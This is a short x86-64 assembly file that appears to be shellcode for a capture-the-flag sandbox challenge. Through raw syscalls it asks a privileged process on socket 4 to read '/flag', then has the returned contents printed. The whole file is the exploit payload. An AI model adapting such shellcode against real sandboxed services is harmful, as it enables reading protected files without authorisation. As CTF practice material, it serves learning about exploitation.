.global _start
_start:
.intel_syntax noprefix

# write(sock2, "read_file:/flag", 128);
mov rax, 1
mov rdi, 4
lea rsi, [rip+read_file]
mov rdx, 128
syscall

# read(sock2, buf, 128);
mov rax, 0
mov rdi, 4
lea rsi, [rip+buf]
mov rdx, 128
syscall

# write(sock2, "print_msg:buf", 128);
mov rax, 1
mov rdi, 4
lea rsi, [rip+print_msg]
mov rdx, 128
syscall


read_file:
.asciz "read_file:/flag"
print_msg:
.ascii "print_msg:"
buf:
.asciz "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
